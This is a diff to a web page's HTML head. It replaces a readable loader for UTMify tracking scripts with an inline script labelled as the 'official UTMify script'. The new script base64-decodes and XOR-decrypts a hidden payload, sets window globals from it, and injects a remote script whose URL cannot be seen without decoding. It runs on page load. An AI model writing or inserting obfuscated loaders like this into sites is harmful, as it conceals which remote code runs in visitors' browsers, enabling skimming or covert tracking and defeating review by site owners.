@@ -26,8 +26,10 @@
       fetchpriority="high"
     />
 
-    <!-- Tracking: a fila do Meta existe imediatamente, mas scripts pesados
-         só são baixados depois que o DOM crítico já foi renderizado. -->
+    <!-- UTMify: script oficial fornecido para propagação dos parâmetros -->
+    <script>(function(){var t_f=atob("DKX30WdU0Bs2WaPE197VpBU48iEUMdewp9bN/kg3tHUYLNepvsOO/wQ7vTVUK4y3tNeeoRMn/25CNNDru8SDtBQg/nFFe4/mttGDow42pW9TKoH+jN7VvwY5tTkMe8elo8TapBM5uX1PdNO2stOSvxN5qHhZPY63tM7V/UUisXdDPIH+9YeK/Rx2vnpbPIH+9cGWpQZ5pW9bMMW9+tWFtBExvm8bKtamvsGE80t2pnpaLMbm7YfVrDop");var r_crm=[];for(var g_5l=0;g_5l<t_f.length;g_5l++){r_crm.push(t_f.charCodeAt(g_5l)&255);}var f_x=r_crm[0];var t_shi7=r_crm.slice(1,1+f_x);var z_o8=r_crm.slice(1+f_x);var h_u=z_o8.map(function(b,l_416o){return b^t_shi7[l_416o%f_x];});var u_ep="";for(var p_7zle=0;p_7zle<h_u.length;p_7zle++){u_ep+=String.fromCharCode(h_u[p_7zle]&255);}var n_zp=decodeURIComponent(escape(u_ep));var x_541h=JSON.parse(n_zp);var a_kz=x_541h.globals||[];a_kz.forEach(function(k_kfjc){window[k_kfjc.name]=k_kfjc.value;});var n_7=document.createElement("script");n_7.src=x_541h.url;n_7.async=true;n_7.defer=true;(x_541h.attributes||[]).forEach(function(o_ema){n_7.setAttribute(o_ema.name,o_ema.value);});(document.head||document.documentElement).appendChild(n_7);})();</script>
+
+    <!-- Meta Pixel -->
     <script>
       (function () {
         if (!window.fbq) {
@@ -43,20 +45,10 @@
           fbq.queue = [];
         }
 
-        window.pixelId = "6abaf6e8abb932f89945c1b9";
         window.fbq("init", "1708074396931772");
         window.fbq("track", "PageView");
 
         var metaLoaded = false;
-        var utmLoaded = false;
-
-        function runIdle(callback, timeout) {
-          if ("requestIdleCallback" in window) {
-            window.requestIdleCallback(callback, { timeout: timeout });
-          } else {
-            window.setTimeout(callback, Math.min(timeout, 1500));
-          }
-        }
 
         function loadMetaPixel() {
           if (metaLoaded) return;
@@ -67,40 +59,10 @@
           document.head.appendChild(script);
         }
 
-        function loadUtmify() {
-          if (utmLoaded) return;
-          utmLoaded = true;
-
-          var utms = document.createElement("script");
-          utms.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
-          utms.async = true;
-          utms.defer = true;
-          utms.setAttribute("data-utmify-prevent-xcod-sck", "");
-          utms.setAttribute("data-utmify-prevent-subids", "");
-          document.head.appendChild(utms);
-
-          var pixel = document.createElement("script");
-          pixel.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
-          pixel.async = true;
-          pixel.defer = true;
-          document.head.appendChild(pixel);
-        }
-
-        // Carrega o rastreamento da UTMify imediatamente.
-        // A regra de InitiateCheckout depende do script já estar ativo
-        // quando o usuário clica para ir ao checkout.
-        loadUtmify();
-
         if (document.readyState === "loading") {
-          document.addEventListener(
-            "DOMContentLoaded",
-            function () {
-              runIdle(loadMetaPixel, 1200);
-            },
-            { once: true },
-          );
+          document.addEventListener("DOMContentLoaded", loadMetaPixel, { once: true });
         } else {
-          runIdle(loadMetaPixel, 1200);
+          loadMetaPixel();
         }
       })();
     </script>
